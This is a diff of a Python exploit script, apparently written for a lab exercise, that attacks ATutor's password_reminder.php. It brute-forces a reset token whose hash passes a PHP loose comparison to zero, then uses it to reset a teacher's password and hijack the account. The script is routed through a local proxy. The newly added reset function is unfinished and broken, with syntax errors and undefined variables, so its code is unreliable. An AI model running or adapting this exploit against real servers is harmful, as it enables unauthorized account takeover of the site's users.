@@ -77,18 +77,15 @@ def gen_code2(ip, id, password):
             print('(+) Request made: %d' % count)
             print('(+) Equivalent loose comparison: %s == 0\n' % (hash))
             foundHash = True
-            set_atutor_password(ip, id, g)
+            setup_atutor_password_reset(ip, id, g)
         count += 1
         g += 1
 
-def set_atutor_password(ip, id, gen):
+def setup_atutor_password_reset(ip, id, gen):
     """
     This will reset the password for the target user
     """
     print('(+) Attempting to reset the teacher password')
-
-    url = 'http://%s/ATutor/password_reminder.php?id=%s&g=%s&h=0' % (ip, str(id), str(gen))
-
     headers = {
             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
@@ -97,12 +94,54 @@ def set_atutor_password(ip, id, gen):
             "Connection": "close",
             "Upgrade-Insecure-Requests": "1"
             }
+
+    proxies = {'http':'http://127.0.0.1:8080'}
+
     s = requests.Session()
-    r = s.get(url, headers=headers)
+
+    #Need to first go to the "http://atutor/ATutor/password_reminder.php" webpage
+    url = 'http://%s/ATutor/password_reminder.php' % (ip)
+    r = s.get(url, headers=headers, proxies=proxies)
     res = r.text
 
-    if "Enter a new password for you account" in res:
+
+    url = 'http://%s/ATutor/password_reminder.php?id=%s&g=%s&h=0' % (ip, str(id), str(gen))
+
+    r = s.get(url, headers=headers, proxies=proxies)
+    res = r.text
+
+    if "Enter a new password for your account." in res:
         print('(+) Successful in submitting hash to the password reset form')
+
+def reset_atutor_password(session, ip):
+    """
+    This is called after we successfuly get a hash collision in the setup_atutor_password_reset() function
+    """
+    headers = {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Content-Length": "146",
+            "Origin": "http://atutor",
+            "Referer": "http://atutor/ATutor/password_reminder.php"
+            "Connection": "close",
+            "Upgrade-Insecure-Requests": "1"
+            }
+
+    data = {
+            "form_change": "true",
+            "id": "1",
+            "g": str(gen),
+            "form_password_hidden": str(password),
+            "password_error":"",
+            "password"
+
+            }
+
+    proxies = {'http':'http://127.0.0.1:8080'}
+
 
 
 def main():
@@ -143,14 +182,14 @@ def main():
         print('(-) Account hijacking failed!')
 
     """
-    if len(sys.argv) != 3:
+    if len(sys.argv) < 3:
         print('(+) usage: %s <target_ip> <member_id> <password_hash>' % sys.argv[0])
         print('(+) e.g.: %s 192.168.137.103 1 8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e' % sys.argv[0])
         sys.exit(-1)
 
     ip = sys.argv[1]
     id = int(sys.argv[2])
-    password = int(sys.argv[3]) if len(sys.argv) == 4 else "8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e"
+    password = sys.argv[3] if len(sys.argv) == 4 else "8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e"
     gen_code2(ip, id, password)
 
 
